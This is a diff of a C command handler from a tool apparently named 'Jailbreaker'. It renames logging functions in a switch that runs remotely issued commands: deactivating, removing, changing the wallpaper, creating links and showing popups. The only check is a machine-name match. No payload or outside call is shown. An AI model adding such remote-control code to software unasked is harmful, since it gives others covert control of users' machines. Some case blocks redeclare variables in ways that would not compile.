@@ -31,13 +31,13 @@ const char *PCName;
 static char wallpaper[MAX_PATH] = BADPATH;
 
 
-// TODO: log these to files instead of console
-void log(const char* message) {
-    printf("%i - LOG: \"%s\"\n", time(NULL), message);
+// TODO: JBlog these to files instead of console
+void JBlog(const char* message) {
+    printf("%lli - JBlog: \"%s\"\n", time(NULL), message);
 }
 
-void logErr(const char *message) {
-    printf("%i - ERROR: \"%s\"\n", time(NULL), message);
+void JBlogErr(const char *message) {
+    printf("%lli - ERROR: \"%s\"\n", time(NULL), message);
 }
 
 
@@ -45,10 +45,10 @@ void execCommand(JBCMD cmd)
 {
     // If strings are different then fail.
     if (strcmp(cmd.auth, PCName)) {
-        logErr("Auth failed.");
+        JBlogErr("Auth failed.");
         return;
     }
-
+    
     switch (cmd.cmd)
     {
     /* --- Templates --- */
@@ -56,7 +56,7 @@ void execCommand(JBCMD cmd)
         
         break;
     case JB_DEACTIVE:
-        log("Jailbreaker deactivated.");
+        JBlog("Jailbreaker deactivated.");
         exit(0);
         break;
     case JB_REMOVE:
@@ -81,7 +81,7 @@ void execCommand(JBCMD cmd)
         break;
     case JB_LOADWALL:
         if (!strcmp(wallpaper, BADPATH)) {
-            logErr("No saved wallpaper");
+            JBlogErr("No saved wallpaper");
             break;
         }
         
@@ -92,7 +92,7 @@ void execCommand(JBCMD cmd)
     case JB_CREATELINKS:
         char *arg1 = strtok(cmd.args, SEP);
         if(!arg1) {
-            logErr("Not enougth arguments");
+            JBlogErr("Not enougth arguments");
             break;
         }
 
@@ -121,7 +121,7 @@ void execCommand(JBCMD cmd)
         //MultiByteToWideChar(CP_ACP, MB_COMPOSITE, cmd.args, CMD_ARGSZ, wideBuffer, CMD_ARGSZ * 2)
         char *arg1 = strtok(cmd.args, SEP);
         if(!arg1) {
-            logErr("Not enought arguments");
+            JBlogErr("Not enought arguments");
             break;
         }
 
@@ -143,7 +143,7 @@ void execCommand(JBCMD cmd)
     case JB_POPUPA:
         char *arg1 = strtok(cmd.args, SEP);
         if(!arg1) {
-            logErr("Not enougth arguments");
+            JBlogErr("Not enougth arguments");
             break;
         }
 
@@ -167,7 +167,7 @@ void execCommand(JBCMD cmd)
         break;
 
     default:
-        logErr("Unknown command");
+        JBlogErr("Unknown command");
         break;
     }
 }
